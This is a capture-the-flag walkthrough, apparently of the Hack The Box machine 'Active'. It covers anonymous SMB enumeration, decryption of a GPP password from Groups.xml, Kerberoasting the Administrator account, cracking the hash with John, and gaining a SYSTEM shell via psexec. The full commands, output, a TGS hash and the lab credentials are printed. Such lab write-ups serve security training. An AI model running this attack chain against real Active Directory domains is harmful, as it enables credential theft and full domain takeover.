---
description: 09-09-22
---

# Active (Easy)

### Improved skills

* Usage of more methodical enumeration techniques
* Go through SMB more efficiently
* When Evil-WinRM is not an option, what else is?
* Kerberoasting

### Used tools <a href="#used-tools" id="used-tools"></a>

* Nmap -- NmapAutomator.sh
* smbmap/smbclient
* Enum4Linux
* Gpp-decrypt
* impacket-GetUserSPNs
* John
* Psexec

## Information Gathering <a href="#information-gathering" id="information-gathering"></a>

Scanned all TCP ports:​

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-09 17:17:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49175/tcp open  msrpc         Microsoft Windows RPC
49176/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Enumerated UDP ports:​

```
PORT    STATE SERVICE VERSION
53/udp  open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
123/udp open  ntp     NTP v3
389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
`
```

Notes:

53/DNS - Attempt zone transfer -- Failed

88/Kerberos - Attempt Kerberoasting if we find valid credentials -- Attempt AS-REPRoasting (must enumerate users first)&#x20;

135/RPC -&#x20;

## Enumeration <a href="#enumeration" id="enumeration"></a>

### Enum4Linux <a href="#port-80-http-apache" id="port-80-http-apache"></a>

```
[+] Attempting to map shares on 10.129.54.94                                                   
                                                                                               
//10.129.54.94/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                              
//10.129.54.94/C$       Mapping: DENIED Listing: N/A Writing: N/A
//10.129.54.94/IPC$     Mapping: OK Listing: DENIED Writing: N/A
//10.129.54.94/NETLOGON Mapping: DENIED Listing: N/A Writing: N/A
//10.129.54.94/Replication      Mapping: OK Listing: OK Writing: N/A
//10.129.54.94/SYSVOL   Mapping: DENIED Listing: N/A Writing: N/A
//10.129.54.94/Users    Mapping: DENIED Listing: N/A Writing: N/A

```

### Smbmap

```
smbmap -u '' -p '' -H 10.129.54.94             373ms  Fri 09 Sep 2022 01:38:21 PM EDT
[+] IP: 10.129.54.94:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS

```

* We see that Replication possesses READ ONLY permissions. Could there be sensitive information in there?

### Smbclient

* I tried many different things here, but authentication via null session worked

```
smbclient -U '%' -N \\\\10.129.54.94\\Replication
```

* Unfortunately, after enumerating our shares, I still could not find anything of value
* Let's try my favorite trick with smbclient -- the -c flag to recursively enumerate the file system with the ls command

```
smbclient //10.129.54.94/Replication -c 'recurse;ls'
```

* We see some interesting files in here such as the USER file and Groups.xml
* How can we go about grabbing these? Let's manually go into smbclient and get them

```
smbclient //10.129.54.94/Replication
Password: (Press enter here for null authentication)

cd \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups

get Groups.xml 
```

### Groups.xml

{% code overflow="wrap" %}
```
cat Groups.xml                                  Fri 09 Sep 2022 02:21:18 PM EDT
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
{% endcode %}

* We see that we have credentials in this file!
* <mark style="color:yellow;">User: SVC\_TGS</mark>
* <mark style="color:yellow;">Password: GPPstillStandingStrong2k18</mark>
* How did we get this password from that long string of text? Well, it is GPP encrypted.
* Since GPP is heavily deprecated, we can crack the password.

### Gpp-decrypt

{% code overflow="wrap" %}
```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```
{% endcode %}

* And as a result, we get our password!

## Exploitation <a href="#exploitation" id="exploitation"></a>

### Kerberoasting <a href="#name-of-the-technique" id="name-of-the-technique"></a>

This is the exploit that I utilized to gain a foothold on the machine because I was able to extract sensitive information from the SMB share (in this case, credentials for a service account).

Naturally, now that I have credentials, I attempted to grab the hash utilizing the GetUserSPNs script

### GetUserSPNs

```
impacket-GetUserSPNs -request 10.129.54.94 active.htb/SVC_TGS:GPPstillStandingStrong2k18


Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-09-09 12:49:51.718920             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7071f54ae8798a0e846f7622938dd38a$44bfa1bd8cd42b7b3da01eb84839509133543f096e4c36f6e567123b1f79f931f6bbdcaa7bdb75f58e351825d94a444e627755aab9443c90467bd00717267c7d37ff187d48f92a616fd8bfc9837397604ef93063a14028d9ea100fbd66e59e908df2f4bb95cdf6fe3cb9aaa8514bb0503749772575f31b85a074df2cfdd4ad2b42710a649f389c7129266df36e0067cd05414551b87c5377b047c934a8a7bddcc6610bc7586d3fa1881abf714e9f4bd9f8f2b41557f37671b9399e41d3bf9dd636be0f948b15d10b04365206752a0189177297f4607f5615f40a50ced113972d80c701b6e0cf5e1baf0327962f063ec0e335561f51468583af1043ea527517de07e4df1d46ece8655e14444e58221cfcc0580802cae0aed707776da901eddc6d15b8ef7b757ead3b41b44433908f9fdff79c97580fcf238040391a19610d376e676bd9616075071f812419c373847bc3966122304932f4f80bba1aa5a71f745252e60947ddb5fc3a18f00f09ed8fd0915622047158664e2d02a3c85ba1e5708c84eead2938f05349cd72258d5954089495070af908881531b83b768ce40cf4e8bd155b9085f2b0fce3481dc8dda551a0dcabf9fc683e4ee408222f95223f552adb1e137b6146767c9a691cadfe684c6df3aecb22d69461dec7a8ae8f5e3f1c4f5ce15ba770711f5b27ae9cfefd5f1be4f30b2c9585e3262bdbcc9d19ac9e3a18d9eafece83c23611e1b5abd94ad65761a1b13af8ae03aa13bd05b8a31e524bbfea517bab498ce18a7fe1ffa8ed1ee2841c13d2df3347c053fd7d94fde1dc4d2938c89ee163d97b462632c222322df3eac16b7f864190e29b1140c05cbb5951e9110cf6851bffc493fb2a549fae97874c7e5ca4dc746bb8f7473aea31bf9c18c08840d1d7fc47644d7f753b303cbfad1a8db6ae87ba3182946cf3bc89111ec4f284fa6608a1f6962c144493ef3494d5cfca2c47ac666e72aedef5190d14f34fd133fba4e2363be191fd06bd334759c42c7502adebe8d4bae6af9612360e9dbe761cb36f9108a3f50fb26f39cd04112ad6bbd387bbd7c09b056f7ba92a9c51153e434b25f56fbd61aefadcb4290012f2d2d887ca0ac48249d82d8d76659473bb6d75c8b43fbd49f94e75a5465e0dafaf3942cdeb293ddb39f47a6d5bb43f95c334b63694eb55b84f95efef5f9cb356b16a5f93b08097207c7b775629663935594284337acad523fcb83fb33a7c8ef57e01a992e5cef55254bfac30

```

BOOM! You can see that we now have a valid hash!

* Let's copy the entire hash and throw it into a file named hash

### John

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash

Ticketmaster1968
```

We now have a password!

* Since there is no WinRM on the box, we need to use psexec to remote into the box

Let's quickly validate how strong this user is

```
crackmapexec smb 10.129.54.94 -u Administrator -p Ticketmaster1968
SMB         10.129.54.94    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.54.94    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

* We see that we have successfully pwned the domain admin and we now have full access to the domain!
* Time to authenticate!

### psexec

```
locate psexec
/usr/share/doc/python3-impacket/examples/psexec.py

python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator@10.129.54.94
Password: Ticketmaster1968

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.54.94.....
[*] Found writable share ADMIN$
[*] Uploading file TJaaWnMi.exe
[*] Opening SVCManager on 10.129.54.94.....
[*] Creating service OAqZ on 10.129.54.94.....
[*] Starting service OAqZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

* We are now System. We have pwned the box!

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

This box did not require privilege escalation due to Kerberoasting being able to grant me an Administrator's credentials.

## Proofs <a href="#proofs" id="proofs"></a>

user.txt

```
type C:\Users\SVC_TGS\Desktop\user.txt
```

root.txt

```
type C:\Users\Administrator\Desktop\root.txt
```

